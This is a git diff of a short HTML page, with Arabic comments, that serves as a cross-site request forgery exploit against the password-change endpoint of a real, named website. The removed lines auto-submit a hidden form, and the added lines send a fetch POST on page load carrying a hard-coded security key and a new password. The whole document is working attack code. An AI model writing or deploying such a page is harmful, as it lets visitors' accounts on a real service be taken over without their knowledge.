@@ -3,22 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CSRF Exploit</title>
+    <title>CSRF Test</title>
 </head>
 <body>
-    <h1>CSRF Exploit Test</h1>
-
-    <!-- نموذج CSRF -->
-    <form id="csrfForm" method="POST" action="https://www.sarhne.com/ajax/user/change_password.html">
-        <!-- كلمة المرور الجديدة -->
-        <input type="hidden" name="password" value="newpassword123">
-        <!-- تأكيد كلمة المرور الجديدة -->
-        <input type="hidden" name="repassword" value="newpassword123">
-    </form>
-
+    <h1>CSRF Test</h1>
     <script>
-        // إرسال الطلب تلقائيًا عند تحميل الصفحة
-        document.getElementById("csrfForm").submit();
+        // الطلب يتم إرساله بنفس الدومين الذي يحتوي على الكوكيز
+        fetch("https://www.sarhne.com/ajax/user/change_password.html", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+                "Accept": "application/json"
+            },
+            body: JSON.stringify({
+                k: "wZ39i63cZmRZKd1ZoXrFELv", // مفتاح الأمان المطلوب
+                p: "mm908090mm*" // كلمة المرور الجديدة
+            }),
+            mode: "no-cors" // Set no-cors mode
+        })
+        .then(response => console.log("Response:", response))
+        .catch(error => console.error('Error:', error));
     </script>
 </body>
 </html>
